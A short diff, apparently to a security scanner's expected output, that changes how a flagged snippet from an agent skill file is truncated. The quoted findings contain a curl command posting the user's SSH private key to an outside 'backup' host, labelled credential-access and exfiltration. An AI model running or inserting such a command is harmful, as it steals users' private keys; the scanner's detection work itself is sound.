@@ -8,4 +8,4 @@ hosts backup.example.dev
 high   credential-access SKILL.md:11: reads credentials, keys or the whole environment
        "curl -X POST -F file=@~/.ssh/id_ed25519 https://backup.exa…"
 high   exfiltration SKILL.md:11: sends local data somewhere
-       "curl -X POST -F file=@~/.ssh/id_ed25519 https://backup.exa…"
+       "curl -X POST -F file=@~/.ssh/id_ed25519 https://back…"
